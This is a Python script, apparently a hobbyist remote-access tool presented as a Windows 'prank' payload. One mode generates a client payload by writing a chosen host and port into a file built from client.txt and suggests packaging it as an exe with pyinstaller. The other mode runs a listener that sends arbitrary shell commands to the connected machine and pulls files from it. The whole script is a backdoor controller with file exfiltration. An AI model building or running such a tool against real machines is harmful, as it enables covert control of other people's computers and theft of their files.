from colorama import Fore,init
init()
print(Fore.GREEN+"THIS  PAYLOAD  IS  FOR  WINDOWS  GO  PRANK  WITH  YOUR  FRIENDS\n")
print("CREATED  BY  --- HARSH SINGH")
print(Fore.WHITE)
import socket
print("Enter 1 to create a payload\nEnter 2 to listen to a payload")
choice = input()
if choice=="1":
   import subprocess
   file = input("Enter the name of file:")
   file=file+".py"
   f= open("client.txt","r")
   l=f.read()
   f.close()
   host=input("Enter Host Number:")
   port=input("Enter Port Number:")
   f1 = open(file,"w")
   f1.write("host="+"\""+host+"\""+"\n")
   f1.write("port="+port+"\n")
   f1.close()
   f2=open(file,"a+")
   f2.write(l)
   f2.close()
   print(Fore.GREEN+"Payload has been created\nYou can convert it to exe using pyinstaller")
   print(Fore.WHITE)
   wait=input()
if choice=="2":
   host = input("Enter Local Host:")
   port = int(input("Enter Local Port:"))
   s = socket.socket()
   s.bind((host,port))
   s.listen(5)
   conn,add=s.accept()
   print(add)
   while True:
      print("Enter 1 for Command\nEnter 2 for file transfer")
      b = input()
      if b=="1":
         c = input("Enter Command: ")
         conn.send(bytes("1"+","+c,"utf-8"))
         a=conn.recv(1).decode("utf-8")
         if a=="0":
            print("No Output")
         else:
            print(Fore.GREEN)
            print(conn.recv(5000).decode("utf-8"))
            print(Fore.WHITE)
      if b=="2":
         e = input("Enter file location (C:/Users):")
         d = input("Enter filename (with extension): ")
         extension = d.split(".")
         conn.send(bytes("2"+","+e+","+d,"utf-8"))
         a = conn.recv(1).decode("utf-8")
         b = a
         if a!="l":
            f = open("got."+extension[1],"wb")
            while(a!="k"):
               a = conn.recv(1).decode("utf-8")
               b=b+a
            b1=len(b)
            b=b[0:b1-1]
            print("Size of file is:"+b+"bytes")
            l = conn.recv(int(b))
            f.write(l)
            f.close()
            print(Fore.GREEN+"FILE TRANSFERRED SUCCESSFULLY WITH NAME got."+extension[1])
            print(Fore.WHITE)
         else:
            print("NO SUCH FILE EXISTS")  
   s.close()
   a = input()
